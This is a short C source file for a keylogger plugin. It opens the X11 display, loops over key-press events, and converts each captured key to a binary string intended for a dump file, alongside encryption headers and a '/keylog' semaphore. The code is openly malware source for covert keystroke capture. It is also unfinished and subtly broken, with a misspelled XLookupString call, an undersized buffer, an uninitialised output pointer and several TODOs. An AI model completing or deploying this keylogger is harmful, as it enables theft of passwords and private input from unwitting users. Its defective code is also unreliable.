#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <X11/Xlib.h>

#include "../include/encrypt.h"
#include "../include/hydrogen.h"
#include "../include/types.h"
#include "../include/system_utils.h"

#define SEM "/keylog"

int init_plugin()
{
	int flag = 0;
	char buffer;
	char* bin_buf;

	Display* dply;
	XEvent event;
	KeySym symb;


	/**
	 * Open the semaphore, for being able to turn off the keylogger
	 */

	// TODO

	/**
	 * Open the display
	 */

	// TODO: Check if we are getting the correct display, suposedly getting DISPLAY enviroment variable

	dply = XOpenDisplay(0);

	while(flag == 0){
		/**
		 * Get the info in bytes and dump it in a bin file
		 */

		XNextEvent(dply, &event);

		if(event.xany.type  == KeyPress){

			// Event to check, buffer where it would be stored, max size, Gets the mod keys(shift
			// ctrl lock), if 0 does not do anything
			XlookupString(&event.xkey, &buffer, 99, &symb, 0);

			//TODO : Do something about the mod keys

			itoa(buffer, bin_buf, 2);

			//TODO: print bin_buf somewhere
		}

	}

}

